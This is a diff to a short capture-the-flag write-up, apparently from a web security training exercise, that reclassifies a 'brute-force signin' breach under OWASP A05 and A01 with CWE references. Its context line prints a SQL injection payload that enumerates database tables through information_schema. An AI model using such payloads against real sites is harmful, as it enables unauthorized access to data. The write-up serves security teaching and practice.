@@ -1,7 +1,10 @@
 # Brute-force signin
 
 ## Breach type:
-A01 + A05
+* A05:2021 Security Misconfiguration 
+    * CWE-16 Configuration, feature that doesn't work installed: page=recover for recover password.
+* A01:2021 Broken Access Control
+    * CWE-200 Exposure of Sensitive Information to an Unauthorized Actor.
 
 ## How to find the flag:
 * Display all the tables of the databases with : `105 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns`
